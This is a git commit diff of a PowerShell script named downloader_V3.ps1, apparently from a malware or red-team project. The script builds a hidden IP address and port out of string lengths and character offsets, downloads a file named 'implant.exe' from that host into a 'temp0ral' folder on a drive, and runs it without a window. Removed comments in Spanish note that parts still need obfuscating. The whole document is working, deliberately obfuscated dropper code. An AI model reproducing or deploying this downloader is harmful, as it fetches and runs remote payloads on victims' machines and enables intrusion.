f1f315fee8c4de7238e27462058fe73ba9cc2ce4
Rafa Barber <96293934+R4ph3@users.noreply.github.com>
2024-05-27 23:07:26 +0200

    Update and rename downloader.ps1 to downloader_V3.ps1

--- downloader_V3.ps1
+++ downloader_V3.ps1
@@ -10,27 +10,24 @@ $str8 = "Hasta que Lebron lo galdea" #26
 $add = ($str7.Length - $str3.Length + 1).ToString() + ($str1.Length - $str4.Length - 2).ToString() + "." + ($str7.Length - 1 + $str4.Length + $str2.Length + $str6.Length + $str1.Length).ToString() + "." + ($str4.Length - $str2.Length).ToString() + "." + ($str1.Length + $str4.Length + $str6.Length + 2).ToString()
 $head = "h" + $str1[31] + $str4[25] + $str2[26] + "://" + $add + ":" + $str8.IndexOf("e") + $str5.IndexOf("Y") + $str8.IndexOf("e") + $str2.IndexOf("M")
 
-#falta ofuscar esto con el nombre final
 $call = "/" + "implant.exe" 
-#mas de lo mismo
 $carpeta = "temp0ral\"
 $malw = "implant.exe"
 $unidadRed = [System.IO.DriveInfo]::GetDrives()
 
 foreach ($i in $unidadRed) {
-    $existe = Test-Path $i$carpeta
+    $existe = Test-Path ($i.Name + $carpeta)
     if ($existe -eq $false) 
     {
-        Write-Output "No existe"
-        New-Item -Path $i$carpeta -ItemType Directory
-        Invoke-WebRequest -URI $head$call -OutFile $i$carpeta$malw
-        Start-Process $i$carpeta$malw
+        New-Item -Path ($i.Name + $carpeta) -ItemType Directory
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($head + $call, ($i.Name + $carpeta + $malw))
+        Start-Process -FilePath ($i.Name + $carpeta + $malw) -NoNewWindow
         break        
     }
     else
     {
-
-        Start-Process $i$carpeta$malw
+        Start-Process -FilePath ($i.Name + $carpeta + $malw) -NoNewWindow
         break  
     }
 }
